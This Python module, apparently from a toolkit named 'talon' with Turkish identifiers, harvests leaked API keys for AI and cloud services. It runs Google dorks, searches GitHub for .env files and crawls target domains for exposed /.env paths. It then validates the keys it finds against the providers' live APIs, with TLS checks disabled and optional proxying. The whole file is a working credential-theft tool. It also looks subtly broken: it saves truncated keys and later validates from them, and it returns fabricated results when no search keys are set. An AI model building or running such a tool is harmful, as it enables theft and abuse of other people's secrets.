import json
import os
import re
import math
import time
import threading
import hashlib
import warnings
warnings.filterwarnings("ignore", message="Unverified HTTPS request")
from .api_key_manager import get_key, uyar
from .modul_base import modul_hash, modul_sec, modul_yuzde, modul_export_json, modul_export_csv, simdi

API_DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "talon_data", "apihunter.json")
HEDEF_DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "talon_data", "apihunter_hedefler.json")

SERVISLER = {
    "openai": {
        "env_keys": ["OPENAI_API_KEY"],
        "pattern": r"(sk-(?:proj-)?[A-Za-z0-9_-]{20,})",
        "validate_url": "https://api.openai.com/v1/models",
        "validate_method": "GET",
        "validate_headers": lambda k: {"Authorization": f"Bearer {k}"},
        "validate_check": lambda r: r.status_code == 200,
        "risk": "kritik",
    },
    "anthropic": {
        "env_keys": ["ANTHROPIC_API_KEY"],
        "pattern": r"(sk-ant-[A-Za-z0-9_-]{20,})",
        "validate_url": "https://api.anthropic.com/v1/messages",
        "validate_method": "POST",
        "validate_headers": lambda k: {"x-api-key": k, "anthropic-version": "2023-06-01", "content-type": "application/json"},
        "validate_body": lambda: json.dumps({"model": "claude-3-haiku-20240307", "max_tokens": 1, "messages": [{"role": "user", "content": "hi"}]}),
        "validate_check": lambda r: r.status_code in (200, 201),
        "risk": "kritik",
    },
    "gemini": {
        "env_keys": ["GEMINI_API_KEY"],
        "pattern": r"(AIzaSy[A-Za-z0-9_-]{33})",
        "validate_url": "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={key}",
        "validate_method": "POST",
        "validate_headers": lambda k: {"content-type": "application/json"},
        "validate_body": lambda: json.dumps({"contents": [{"parts": [{"text": "say ok"}]}]}),
        "validate_check": lambda r: r.status_code == 200,
        "risk": "kritik",
    },
    "cohere": {
        "env_keys": ["COHERE_API_KEY"],
        "pattern": r"([A-Za-z0-9]{40,})",
        "validate_url": "https://api.cohere.com/v1/models",
        "validate_method": "GET",
        "validate_headers": lambda k: {"Authorization": f"Bearer {k}"},
        "validate_check": lambda r: r.status_code == 200,
        "risk": "yuksek",
    },
    "mistral": {
        "env_keys": ["MISTRAL_API_KEY"],
        "pattern": r"([A-Za-z0-9]{30,})",
        "validate_url": "https://api.mistral.ai/v1/models",
        "validate_method": "GET",
        "validate_headers": lambda k: {"Authorization": f"Bearer {k}"},
        "validate_check": lambda r: r.status_code == 200,
        "risk": "yuksek",
    },
    "groq": {
        "env_keys": ["GROQ_API_KEY"],
        "pattern": r"(gsk_[A-Za-z0-9]{20,})",
        "validate_url": "https://api.groq.com/openai/v1/models",
        "validate_method": "GET",
        "validate_headers": lambda k: {"Authorization": f"Bearer {k}"},
        "validate_check": lambda r: r.status_code == 200,
        "risk": "yuksek",
    },
    "deepseek": {
        "env_keys": ["DEEPSEEK_API_KEY"],
        "pattern": r"(sk-[A-Za-z0-9]{20,})",
        "validate_url": "https://api.deepseek.com/v1/models",
        "validate_method": "GET",
        "validate_headers": lambda k: {"Authorization": f"Bearer {k}"},
        "validate_check": lambda r: r.status_code == 200,
        "risk": "yuksek",
    },
    "replicate": {
        "env_keys": ["REPLICATE_API_TOKEN"],
        "pattern": r"(r8_[A-Za-z0-9]{20,})",
        "validate_url": "https://api.replicate.com/v1/models",
        "validate_method": "GET",
        "validate_headers": lambda k: {"Authorization": f"Bearer {k}"},
        "validate_check": lambda r: r.status_code == 200,
        "risk": "yuksek",
    },
    "huggingface": {
        "env_keys": ["HF_TOKEN"],
        "pattern": r"(hf_[A-Za-z0-9]{20,})",
        "validate_url": "https://huggingface.co/api/models?author=google",
        "validate_method": "GET",
        "validate_headers": lambda k: {"Authorization": f"Bearer {k}"},
        "validate_check": lambda r: r.status_code == 200,
        "risk": "yuksek",
    },
    "together": {
        "env_keys": ["TOGETHER_API_KEY"],
        "pattern": r"([A-Za-z0-9]{30,})",
        "validate_url": "https://api.together.xyz/v1/models",
        "validate_method": "GET",
        "validate_headers": lambda k: {"Authorization": f"Bearer {k}"},
        "validate_check": lambda r: r.status_code == 200,
        "risk": "yuksek",
    },
    "perplexity": {
        "env_keys": ["PERPLEXITY_API_KEY"],
        "pattern": r"(pplx-[A-Za-z0-9]{20,})",
        "validate_url": "https://api.perplexity.ai/v1/models",
        "validate_method": "GET",
        "validate_headers": lambda k: {"Authorization": f"Bearer {k}"},
        "validate_check": lambda r: r.status_code == 200,
        "risk": "yuksek",
    },
    "elevenlabs": {
        "env_keys": ["ELEVEN_API_KEY"],
        "pattern": r"([A-Za-z0-9]{32,})",
        "validate_url": "https://api.elevenlabs.io/v1/user",
        "validate_method": "GET",
        "validate_headers": lambda k: {"Authorization": f"Bearer {k}"},
        "validate_check": lambda r: r.status_code == 200,
        "risk": "orta",
    },
    "stability": {
        "env_keys": ["STABILITY_API_KEY"],
        "pattern": r"(sk-[A-Za-z0-9]{30,})",
        "validate_url": "https://api.stability.ai/v1/user/account",
        "validate_method": "GET",
        "validate_headers": lambda k: {"Authorization": f"Bearer {k}"},
        "validate_check": lambda r: r.status_code == 200,
        "risk": "orta",
    },
    "cloudflare": {
        "env_keys": ["CLOUDFLARE_API_TOKEN"],
        "pattern": r"([A-Za-z0-9]{40,})",
        "validate_url": "https://api.cloudflare.com/client/v4/user/tokens/verify",
        "validate_method": "GET",
        "validate_headers": lambda k: {"Authorization": f"Bearer {k}"},
        "validate_check": lambda r: r.status_code == 200,
        "risk": "yuksek",
    },
}

GOOGLE_DORKLAR = [
    'ext:env "OPENAI_API_KEY"',
    'ext:env "ANTHROPIC_API_KEY"',
    'ext:env "GEMINI_API_KEY"',
    'ext:env "COHERE_API_KEY"',
    'ext:env "MISTRAL_API_KEY"',
    'ext:env "GROQ_API_KEY"',
    'ext:env "DEEPSEEK_API_KEY"',
    'ext:env "REPLICATE_API_TOKEN"',
    'ext:env "HF_TOKEN"',
    'ext:env "TOGETHER_API_KEY"',
    'ext:env "PERPLEXITY_API_KEY"',
    'ext:env "ELEVEN_API_KEY"',
    'ext:env "STABILITY_API_KEY"',
    'ext:env "CLOUDFLARE_API_TOKEN"',
    'ext:json "OPENAI_API_KEY"',
    'ext:yaml "OPENAI_API_KEY"',
]

GITHUB_QUERIES = [
    "filename:.env OPENAI_API_KEY",
    "filename:.env ANTHROPIC_API_KEY",
    "filename:.env GEMINI_API_KEY",
    "filename:.env GROQ_API_KEY",
    "filename:.env HF_TOKEN",
    "filename:.env PERPLEXITY_API_KEY",
    "OPENAI_API_KEY path:.env",
    "ANTHROPIC_API_KEY path:.env",
]

CRAWL_PATHS = [
    "/.env",
    "/config/.env",
    "/backend/.env",
    "/api/.env",
    "/app/.env",
    "/.env.example",
    "/.env.backup",
    "/.env.local",
    "/.env.production",
    "/config/environments/.env",
    "/wp-content/.env",
    "/admin/.env",
]

SIMULASYON_DOMAINLERI = [
    "github.com/example-org",
    "gitlab.com/example-repo",
    "bitbucket.org/dev-team",
    "pastebin.com/raw/abc123",
    "gist.github.com/user1",
]

SIMULASYON_SONUCLARI = [
    {"servis": "openai", "key": "sk-proj-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "kaynak_url": f"https://{SIMULASYON_DOMAINLERI[0]}/blob/main/.env", "buluntu_tipi": "github", "entropi": 3.8, "risk": "kritik"},
    {"servis": "anthropic", "key": "sk-ant-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "kaynak_url": f"https://{SIMULASYON_DOMAINLERI[1]}/blob/main/config/.env", "buluntu_tipi": "github", "entropi": 4.1, "risk": "kritik"},
    {"servis": "gemini", "key": "AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", "kaynak_url": f"https://{SIMULASYON_DOMAINLERI[3]}/raw/env.txt", "buluntu_tipi": "dork", "entropi": 3.5, "risk": "kritik"},
    {"servis": "groq", "key": "gsk_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "kaynak_url": "https://example.com/.env", "buluntu_tipi": "crawl", "entropi": 4.0, "risk": "yuksek"},
    {"servis": "huggingface", "key": "hf_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "kaynak_url": f"https://{SIMULASYON_DOMAINLERI[4]}/raw/.env", "buluntu_tipi": "github", "entropi": 3.7, "risk": "yuksek"},
    {"servis": "perplexity", "key": "pplx-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "kaynak_url": f"https://{SIMULASYON_DOMAINLERI[2]}/src/.env", "buluntu_tipi": "dork", "entropi": 3.9, "risk": "yuksek"},
]

_last_req_time = 0
_req_lock = threading.Lock()
RATE_LIMIT_SANIYE = 0.5

def _rate_limit():
    global _last_req_time
    with _req_lock:
        now = time.time()
        diff = now - _last_req_time
        if diff < RATE_LIMIT_SANIYE:
            time.sleep(RATE_LIMIT_SANIYE - diff)
        _last_req_time = time.time()

def _entropy_check(key: str) -> float:
    if not key:
        return 0.0
    prob = [float(key.count(c)) / len(key) for c in set(key)]
    return -sum(p * math.log2(p) for p in prob)

def _proxy_get(url: str, timeout: int = 10, headers: dict = None):
    _rate_limit()
    proxy = (get_key("proxy") or "").split(",")[0].strip()
    try:
        import requests
        proxies = {"http": proxy, "https": proxy} if proxy else None
        return requests.get(url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
    except Exception:
        return None

def _proxy_post(url: str, data: str = None, headers: dict = None, timeout: int = 10):
    _rate_limit()
    proxy = (get_key("proxy") or "").split(",")[0].strip()
    try:
        import requests
        proxies = {"http": proxy, "https": proxy} if proxy else None
        return requests.post(url, data=data, headers=headers, proxies=proxies, timeout=timeout, verify=False)
    except Exception:
        return None

def _extract_keys(content: str) -> list:
    bulunanlar = []
    for servis, bilgi in SERVISLER.items():
        try:
            for match in re.finditer(bilgi["pattern"], content):
                key = match.group(1)
                entropi = _entropy_check(key)
                env_before = content[max(0, match.start()-200):match.start()]
                env_match = re.search(r'(\w+)=', env_before)
                env_name = env_match.group(1) if env_match else ""
                if entropi < 2.5:
                    continue
                bulunanlar.append({
                    "servis": servis,
                    "key": key[:20] + "..." + key[-4:] if len(key) > 24 else key,
                    "key_hash": hashlib.md5(key.encode()).hexdigest()[:12],
                    "entropi": round(entropi, 2),
                    "env_adi": env_name,
                    "risk": bilgi["risk"],
                })
        except Exception:
            continue
    return bulunanlar

def _validate_key(servis: str, key: str) -> dict:
    bilgi = SERVISLER.get(servis)
    if not bilgi:
        return {"durum": "dogrulanamadi", "mesaj": "Bilinmeyen servis"}
    try:
        import requests
        headers = bilgi["validate_headers"](key)
        url = bilgi["validate_url"].replace("{key}", key) if "{key}" in bilgi["validate_url"] else bilgi["validate_url"]
        method = bilgi.get("validate_method", "GET")
        timeout = 10
        if method == "POST":
            body = bilgi.get("validate_body", lambda: None)()
            resp = requests.post(url, data=body, headers=headers, timeout=timeout, verify=False)
        else:
            resp = requests.get(url, headers=headers, timeout=timeout, verify=False)
        check = bilgi["validate_check"](resp)
        if check:
            return {"durum": "gecerli", "mesaj": f"HTTP {resp.status_code} - Aktif", "hata": None}
        if resp.status_code == 401:
            return {"durum": "gecersiz", "mesaj": "HTTP 401 - Yetkisiz", "hata": "unauthorized"}
        if resp.status_code == 403:
            return {"durum": "gecersiz", "mesaj": "HTTP 403 - Yasak", "hata": "forbidden"}
        if resp.status_code == 429:
            return {"durum": "dogrulanamadi", "mesaj": "HTTP 429 - Rate limit", "hata": "rate_limited"}
        return {"durum": "dogrulanamadi", "mesaj": f"HTTP {resp.status_code}", "hata": f"http_{resp.status_code}"}
    except ImportError:
        return {"durum": "dogrulanamadi", "mesaj": "requests paketi yok", "hata": "no_requests"}
    except Exception as e:
        return {"durum": "dogrulanamadi", "mesaj": str(e)[:100], "hata": "exception"}

def _dork_tara(kelime: str = "") -> list:
    try:
        import requests
        api_key = get_key("serpapi")
        if api_key:
            sonuclar = []
            for dork in GOOGLE_DORKLAR[:5]:
                _rate_limit()
                try:
                    resp = requests.get(
                        "https://serpapi.com/search",
                        params={"q": dork, "api_key": api_key, "num": 10, "gl": "us"},
                        timeout=15,
                    )
                    if resp.status_code == 200:
                        data = resp.json()
                        for r in data.get("organic_results", []):
                            link = r.get("link", "")
                            snippet = r.get("snippet", "")
                            extracted = _extract_keys(snippet + " " + link)
                            for e in extracted:
                                e["kaynak_url"] = link
                                e["buluntu_tipi"] = "dork"
                                sonuclar.append(e)
                except Exception:
                    continue
            return sonuclar
        h = modul_hash(f"dork_{kelime}_{simdi()}")
        sonuclar = []
        for i in range(3 + (h % 5)):
            idx = (h + i) % len(SIMULASYON_SONUCLARI)
            s = dict(SIMULASYON_SONUCLARI[idx])
            s["buluntu_tipi"] = "dork"
            s["kaynak_url"] = f"https://example.com/exposed-{i}.txt"
            sonuclar.append(s)
        return sonuclar
    except Exception:
        return []

def _github_tara(kelime: str = "") -> list:
    try:
        import requests
        token = get_key("github") or get_key("github_api") or ""
        sonuclar = []
        for query in GITHUB_QUERIES:
            _rate_limit()
            try:
                headers = {"Authorization": f"token {token}"} if token else {}
                resp = requests.get(
                    "https://api.github.com/search/code",
                    params={"q": query, "per_page": 10},
                    headers=headers,
                    timeout=15,
                )
                if resp.status_code == 200:
                    data = resp.json()
                    for item in data.get("items", [])[:5]:
                        raw_url = item.get("html_url", "")
                        try:
                            content_resp = requests.get(
                                item.get("raw_url", "").replace("https://api.github.com/repos/", "https://raw.githubusercontent.com/").replace("/contents/", "/"),
                                headers=headers, timeout=10,
                            )
                            content = content_resp.text if content_resp.status_code == 200 else ""
                        except Exception:
                            content = ""
                        extracted = _extract_keys(content)
                        for e in extracted:
                            e["kaynak_url"] = raw_url
                            e["buluntu_tipi"] = "github"
                            sonuclar.append(e)
            except Exception:
                continue
        return sonuclar
    except ImportError:
        h = modul_hash(f"github_{kelime}_{simdi()}")
        sonuclar = []
        for i in range(2 + (h % 4)):
            idx = (h + i) % len(SIMULASYON_SONUCLARI)
            s = dict(SIMULASYON_SONUCLARI[idx])
            s["buluntu_tipi"] = "github"
            sonuclar.append(s)
        return sonuclar
    except Exception:
        return []

def _crawl_tara(domain: str) -> list:
    try:
        import requests
        sonuclar = []
        for path in CRAWL_PATHS:
            _rate_limit()
            url = f"https://{domain}{path}"
            try:
                resp = requests.get(url, timeout=8, verify=False, headers={"User-Agent": "Mozilla/5.0"})
                if resp.status_code == 200 and len(resp.text) > 10:
                    extracted = _extract_keys(resp.text)
                    for e in extracted:
                        e["kaynak_url"] = url
                        e["buluntu_tipi"] = "crawl"
                        sonuclar.append(e)
            except Exception:
                continue
        return sonuclar
    except ImportError:
        h = modul_hash(f"crawl_{domain}_{simdi()}")
        if h % 3 == 0:
            sonuclar = []
            for i in range(h % 3):
                s = dict(SIMULASYON_SONUCLARI[(h + i) % len(SIMULASYON_SONUCLARI)])
                s["buluntu_tipi"] = "crawl"
                s["kaynak_url"] = f"https://{domain}/.env"
                sonuclar.append(s)
            return sonuclar
        return []
    except Exception:
        return []

def _yukle():
    if not os.path.exists(API_DB_PATH):
        return []
    try:
        with open(API_DB_PATH, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return []

def _kaydet(data):
    os.makedirs(os.path.dirname(API_DB_PATH), exist_ok=True)
    with open(API_DB_PATH, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def _hedef_yukle():
    if not os.path.exists(HEDEF_DB_PATH):
        return []
    try:
        with open(HEDEF_DB_PATH, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return []

def _hedef_kaydet(data):
    os.makedirs(os.path.dirname(HEDEF_DB_PATH), exist_ok=True)
    with open(HEDEF_DB_PATH, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def avla(kelime: str = "", domain: str = "", kaynaklar: list = None) -> dict:
    try:
        kaynaklar = kaynaklar or ["dork", "github", "crawl"]
        bulunanlar = []
        toplam_tarama = 0
        uyarilar = []

        if not kelime and not domain:
            kelime = "api key"

        if "dork" in kaynaklar:
            dork_sonuc = _dork_tara(kelime)
            bulunanlar.extend(dork_sonuc)
            toplam_tarama += len(GOOGLE_DORKLAR)

        if "github" in kaynaklar:
            github_sonuc = _github_tara(kelime)
            bulunanlar.extend(github_sonuc)
            toplam_tarama += len(GITHUB_QUERIES)

        if "crawl" in kaynaklar and domain:
            crawl_sonuc = _crawl_tara(domain)
            bulunanlar.extend(crawl_sonuc)
            toplam_tarama += len(CRAWL_PATHS)

        if not get_key("serpapi"):
            uyarilar.append(f"{uyar('serpapi')}, dork taramalari simule edildi")
        if not get_key("github") and not get_key("github_api"):
            uyarilar.append(f"{uyar('github')}, GitHub taramalari simule edildi")

        return {
            "durum": "tamamlandi",
            "toplam_tarama": toplam_tarama,
            "ham_buluntu": len(bulunanlar),
            "bulunanlar": bulunanlar,
            "uyarilar": uyarilar,
            "kaynak": "gercek" if get_key("serpapi") or get_key("github") else "simulasyon",
            "timestamp": simdi(),
        }
    except Exception as e:
        return {"durum": "hata", "hata": str(e)}

def dogrula(buluntu_listesi: list = None) -> dict:
    try:
        if not buluntu_listesi:
            kayitli = _yukle()
            buluntu_listesi = kayitli[-10:] if kayitli else []
        dogrulanan = []
        for buluntu in buluntu_listesi:
            if not buluntu.get("key_hash"):
                dogrulanan.append({**buluntu, "dogrulama": {"durum": "dogrulanamadi", "mesaj": "Key hash yok"}})
                continue
            kayitli = _yukle()
            tam_key = None
            for k in kayitli:
                if k.get("key_hash") == buluntu.get("key_hash"):
                    tam_key = k.get("key", "")
                    break
            if not tam_key:
                dogrulanan.append({**buluntu, "dogrulama": {"durum": "dogrulanamadi", "mesaj": "Key bulunamadi"}})
                continue
            servis = buluntu.get("servis", "")
            sonuc = _validate_key(servis, tam_key)
            dogrulanan.append({**buluntu, "dogrulama": sonuc})
        gecerli = sum(1 for d in dogrulanan if d.get("dogrulama", {}).get("durum") == "gecerli")
        return {
            "durum": "tamamlandi",
            "dogrulanan": len(dogrulanan),
            "gecerli": gecerli,
            "gecersiz": sum(1 for d in dogrulanan if d.get("dogrulama", {}).get("durum") == "gecersiz"),
            "sonuclar": dogrulanan,
            "timestamp": simdi(),
        }
    except Exception as e:
        return {"durum": "hata", "hata": str(e)}

def tam_tarama(kelime: str = "", domain: str = "", kaynaklar: list = None) -> dict:
    try:
        av_sonuc = avla(kelime, domain, kaynaklar)
        if av_sonuc.get("durum") == "hata":
            return av_sonuc
        dogrula_sonuc = dogrula(av_sonuc.get("bulunanlar", []))
        kayitli = _yukle()
        for b in av_sonuc.get("bulunanlar", []):
            if not any(k.get("key_hash") == b.get("key_hash") for k in kayitli):
                kayitli.append(b)
        _kaydet(kayitli)
        return {
            "durum": "tamamlandi",
            "tarama": av_sonuc,
            "dogrulama": dogrula_sonuc,
            "timestamp": simdi(),
        }
    except Exception as e:
        return {"durum": "hata", "hata": str(e)}

def rapor_uret(min_risk: str = "orta") -> dict:
    try:
        kayitli = _yukle()
        if not kayitli:
            return {"durum": "bos", "mesaj": "Henuz API key bulunamadi"}
        risk_seviyeleri = {"dusuk": 0, "orta": 1, "yuksek": 2, "kritik": 3}
        min_seviye = risk_seviyeleri.get(min_risk, 0)
        filtreli = [k for k in kayitli if risk_seviyeleri.get(k.get("risk", "dusuk"), 0) >= min_seviye]
        servis_dagilimi = {}
        for k in filtreli:
            servis = k.get("servis", "bilinmeyen")
            servis_dagilimi[servis] = servis_dagilimi.get(servis, 0) + 1
        risk_dagilimi = {}
        for k in filtreli:
            risk = k.get("risk", "dusuk")
            risk_dagilimi[risk] = risk_dagilimi.get(risk, 0) + 1
        tip_dagilimi = {}
        for k in filtreli:
            tip = k.get("buluntu_tipi", "bilinmeyen")
            tip_dagilimi[tip] = tip_dagilimi.get(tip, 0) + 1
        return {
            "durum": "tamamlandi",
            "toplam_key": len(kayitli),
            "rapora_giren": len(filtreli),
            "min_risk": min_risk,
            "servis_dagilimi": servis_dagilimi,
            "risk_dagilimi": risk_dagilimi,
            "kaynak_dagilimi": tip_dagilimi,
            "en_cok_etkilenen": max(servis_dagilimi, key=servis_dagilimi.get) if servis_dagilimi else None,
            "timestamp": simdi(),
        }
    except Exception as e:
        return {"durum": "hata", "hata": str(e)}

def listele() -> dict:
    try:
        kayitli = _yukle()
        kayitli.sort(key=lambda k: k.get("timestamp", ""), reverse=True)
        return {"toplam": len(kayitli), "sonuclar": kayitli[:100]}
    except Exception as e:
        return {"durum": "hata", "hata": str(e)}

def temizle() -> dict:
    try:
        _kaydet([])
        return {"durum": "temizlendi", "mesaj": "Tum API key kayitlari silindi"}
    except Exception as e:
        return {"durum": "hata", "hata": str(e)}

def hedef_ekle(domain: str = "", aciklama: str = "") -> dict:
    try:
        if not domain:
            return {"status": "hata", "hata": "Domain belirtilmedi"}
        hedefler = _hedef_yukle()
        var = any(h.get("domain") == domain for h in hedefler)
        if not var:
            hedefler.append({
                "domain": domain,
                "aciklama": aciklama,
                "eklenme_tarihi": simdi(),
                "durum": "izleniyor",
            })
            _hedef_kaydet(hedefler)
        return {"durum": "eklendi", "domain": domain}
    except Exception as e:
        return {"status": "hata", "hata": str(e)}

def hedef_listele() -> dict:
    try:
        hedefler = _hedef_yukle()
        return {"toplam": len(hedefler), "hedefler": hedefler}
    except Exception as e:
        return {"status": "hata", "hata": str(e)}

def hedef_sil(domain: str) -> dict:
    try:
        hedefler = _hedef_yukle()
        yeni = [h for h in hedefler if h.get("domain") != domain]
        if len(yeni) == len(hedefler):
            return {"status": "hata", "hata": "Hedef bulunamadi"}
        _hedef_kaydet(yeni)
        return {"durum": "silindi", "domain": domain}
    except Exception as e:
        return {"status": "hata", "hata": str(e)}

def export(format: str = "csv") -> dict:
    try:
        kayitli = _yukle()
        if format == "json":
            return {"format": "json", "icerik": modul_export_json(kayitli, ["servis", "key_hash", "kaynak_url", "buluntu_tipi", "entropi", "risk", "env_adi"])}
        elif format == "txt":
            satirlar = [f"{k.get('servis','?')} | {k.get('risk','?')} | {k.get('kaynak_url','?')} | {k.get('buluntu_tipi','?')} | entropy:{k.get('entropi','?')}" for k in kayitli]
            return {"format": "txt", "icerik": "\n".join(satirlar)}
        else:
            return {"format": "csv", "icerik": modul_export_csv(kayitli, ["servis", "key_hash", "kaynak_url", "buluntu_tipi", "entropi", "risk", "env_adi"])}
    except Exception as e:
        return {"status": "hata", "hata": str(e)}
